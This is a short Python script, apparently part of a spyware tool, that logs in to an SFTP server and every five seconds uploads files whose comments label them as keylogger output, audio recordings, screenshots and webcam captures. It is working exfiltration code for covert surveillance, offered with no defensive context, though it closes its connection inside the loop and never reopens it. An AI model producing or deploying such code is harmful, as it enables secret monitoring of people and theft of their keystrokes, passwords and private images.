import pysftp
import time

sftp = pysftp.Connection(host= '',username='',password='') #server credentials

while True:   
    with sftp.cd('ftp'):
        sftp.put('klog.txt',preserve_mtime=True) #update keylogger
        sftp.put('Recording.avi',preserve_mtime=True) #update audio
        sftp.put('screenshot.png',preserve_mtime=True) #update screenshot
        sftp.put('output.wav',preserve_mtime=True) #update webcam 
    sftp.close()
    time.sleep(5)